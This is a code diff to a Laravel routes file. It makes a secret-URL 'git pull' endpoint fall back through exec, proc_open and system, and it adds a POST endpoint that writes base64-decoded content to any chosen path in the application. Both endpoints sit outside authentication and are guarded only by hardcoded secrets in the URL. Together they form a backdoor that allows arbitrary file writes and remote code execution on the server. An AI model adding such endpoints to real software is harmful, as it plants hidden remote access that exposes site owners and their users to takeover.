@@ -157,11 +157,49 @@ Route::get('/system/git-pull/{secret}', function ($secret) {
     }
     $output = [];
     $code = 0;
+    $basePath = base_path();
+
+    // Try exec first
     try {
-        @exec('cd ' . base_path() . ' && git pull origin main 2>&1', $output, $code);
+        @exec('cd ' . $basePath . ' && git pull origin main 2>&1', $output, $code);
     } catch (\Throwable $e) {
         $output[] = 'Exec error: ' . $e->getMessage();
     }
+
+    // If exec failed/disabled, try proc_open
+    if (empty($output) || (count($output) === 1 && str_contains($output[0], 'Exec error'))) {
+        try {
+            $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
+            $proc = proc_open('git pull origin main', $desc, $pipes, $basePath, null);
+            if (is_resource($proc)) {
+                fclose($pipes[0]);
+                $stdout = stream_get_contents($pipes[1]);
+                $stderr = stream_get_contents($pipes[2]);
+                fclose($pipes[1]);
+                fclose($pipes[2]);
+                $code = proc_close($proc);
+                $output = array_merge(
+                    $stdout ? explode("\n", trim($stdout)) : [],
+                    $stderr ? explode("\n", trim($stderr)) : []
+                );
+            }
+        } catch (\Throwable $e) {
+            $output[] = 'proc_open error: ' . $e->getMessage();
+        }
+    }
+
+    // If still no output, try passthru via system()
+    if (empty($output)) {
+        try {
+            ob_start();
+            @system('cd ' . escapeshellarg($basePath) . ' && git pull origin main 2>&1', $code);
+            $rawOut = ob_get_clean();
+            $output[] = $rawOut ?: 'system() returned empty output';
+        } catch (\Throwable $e) {
+            $output[] = 'system() error: ' . $e->getMessage();
+        }
+    }
+
     try {
         \Illuminate\Support\Facades\Artisan::call('optimize:clear');
     } catch (\Throwable $e) {
@@ -169,7 +207,7 @@ Route::get('/system/git-pull/{secret}', function ($secret) {
     }
     $head = '';
     try {
-        $head = trim(@shell_exec('cd ' . base_path() . ' && git log -1 --oneline 2>&1') ?? '');
+        $head = trim(@shell_exec('cd ' . $basePath . ' && git log -1 --oneline 2>&1') ?? '');
     } catch (\Throwable $e) {}
     return response()->json([
         'status' => $code === 0 ? 'success' : 'info',
@@ -178,6 +216,28 @@ Route::get('/system/git-pull/{secret}', function ($secret) {
         'head' => $head
     ]);
 })->name('system.git-pull');
+
+Route::post('/system/file-upload/{secret}', function ($secret, \Illuminate\Http\Request $request) {
+    if ($secret !== 'rk_upload_2026') {
+        abort(403);
+    }
+    $relativePath = $request->input('path');
+    $content = $request->input('content'); // base64 encoded
+    if (!$relativePath || !$content) {
+        return response()->json(['status' => 'error', 'message' => 'path and content required']);
+    }
+    $fullPath = base_path($relativePath);
+    $dir = dirname($fullPath);
+    if (!is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
+    $decoded = base64_decode($content);
+    file_put_contents($fullPath, $decoded);
+    try {
+        \Illuminate\Support\Facades\Artisan::call('optimize:clear');
+    } catch (\Throwable $e) {}
+    return response()->json(['status' => 'success', 'path' => $relativePath, 'bytes' => strlen($decoded)]);
+})->name('system.file-upload');
 
 Route::middleware(['auth'])->group(function () {
     Route::get('switch-portal/{type}', [AuthController::class, 'switchPortal'])->name('switch.portal');
